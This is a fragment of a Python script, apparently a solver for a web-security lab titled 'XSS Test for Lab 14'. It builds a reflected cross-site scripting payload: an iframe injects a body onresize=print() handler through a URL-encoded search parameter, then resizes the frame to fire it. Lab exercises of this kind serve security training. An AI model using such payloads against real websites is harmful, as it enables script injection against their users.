...
def xss_test(url, use_proxy=False):
    try:
        ...
        payload = f'<iframe src={url}?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width="100px">'
...
def main():
    parser = argparse.ArgumentParser(description='XSS Test for Lab 14')
